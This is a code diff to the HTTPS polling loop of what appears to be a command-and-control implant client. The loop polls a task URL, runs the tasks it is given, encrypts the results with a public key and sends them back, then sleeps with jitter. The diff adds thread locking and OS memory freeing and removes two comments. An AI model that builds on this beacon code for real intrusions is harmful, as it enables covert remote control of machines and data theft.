@@ -7,6 +7,8 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"runtime"
+	"runtime/debug"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -28,6 +30,7 @@ func httpsMode() {
 		log.Fatal(err)
 	}
 	go func() {
+		runtime.LockOSThread()
 		// were checked in and now we can poll for tasks
 		for {
 			t, err := client.ClientHttpsPollHandler(client.Client, taskUrl)
@@ -51,8 +54,6 @@ func httpsMode() {
 					client.ClientInterrupt <- os.Interrupt
 					break
 				}
-				//log.Println(result)
-				// encrypt marshaled task result.
 				encryptedTaskResult, err := client.Client.EncryptMessageWithPubKey(result.ToBytes())
 				if err != nil {
 					client.ClientInterrupt <- os.Interrupt
@@ -69,8 +70,11 @@ func httpsMode() {
 				client.ClientInterrupt <- os.Interrupt
 				break
 			}
+			debug.FreeOSMemory()
 			time.Sleep(time.Second * time.Duration(client.Client.Jitter))
+			debug.FreeOSMemory()
 		}
+		runtime.UnlockOSThread()
 	}()
 	for {
 		select {
